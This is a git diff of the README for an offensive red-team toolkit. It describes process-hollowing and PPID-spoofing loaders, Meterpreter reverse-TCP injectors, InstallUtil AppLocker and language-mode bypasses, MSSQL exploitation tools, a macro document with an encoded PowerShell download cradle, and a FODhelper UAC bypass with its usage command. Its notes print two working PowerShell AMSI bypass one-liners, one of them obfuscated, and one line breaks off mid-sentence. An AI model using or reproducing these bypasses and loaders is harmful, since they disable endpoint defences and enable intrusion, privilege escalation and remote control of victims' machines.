@@ -22,15 +22,13 @@ clhollow - C# project source code for (IP + port + PPID + process) cli passed pr
 
 Servicehollow - C# project that compiles to a service exe that performs process hollowing + ppid spoofing.  Create service that will run as system on computer boot with sc create <servicename> binpath= c:\path\to\file.exe start= auto
 
-bypass-clm - C# project source code for InstallUtil bypass for executing powershell commands interactively via cli.  Contains AMSI patch
-
 sql - C# project source code for SQL.exe project for exploitation of MSSQL servers in AD.
 
 x64_met_staged_reversetcp_inject.exe - Command line args: IP PORT PROCESS_TO_INJECT(explorer)
 
 x64_met_staged_reversetcp_hollow.exe - Command line args: IP PORT PROCESS_TO_HOLLOW(c:\\windows\\system32\\svchost.exe) PPID_SPOOF(explorer) 
-
-bypass-ps.exe - For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode.
+  
+ps-bypass - For use with InstallUtil. Contains AMSI binary patch. Will start an interactive powershell session in FullLanguageMode.
 
 sql.exe - x64 application for exploitation of linked SQL servers.  Has functionality for use with InstallUtil AppLocker bypass.
 
@@ -38,14 +36,21 @@ pscradle.docm - Word doc with caeser cipher encoding that calls powershell downl
 
 vbobfuscate.ps1 - ps1 to generate caeser cipher code for pscradle.  Make sure offsets match for encrypt/decrypt. First output is download cradle, last is app name for app name check before running. 
 
-uacbypass.ps1 - UAC bypass using FODhelper to elevate priviliges on a user account who has Administrator privs but is running in a medium integrity process.
+uacbypass.ps1 - UAC bypass using FODhelper to elevate priviliges on a user account who has Administrator privs but is running in a medium integrity process. Usage: Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;. .\bypass.ps1;alt
+(note this will prompt 
   
 
 # NOTES
   
 Powershell AMSI bypass:
   
+  Win10
+  
   $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+  
+  Win10+Win11
+  
+  S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
   
  Powershell Dll download cradle (replace ip/file name but leave rest as is when using D/invoke builder generated payloads!):
   
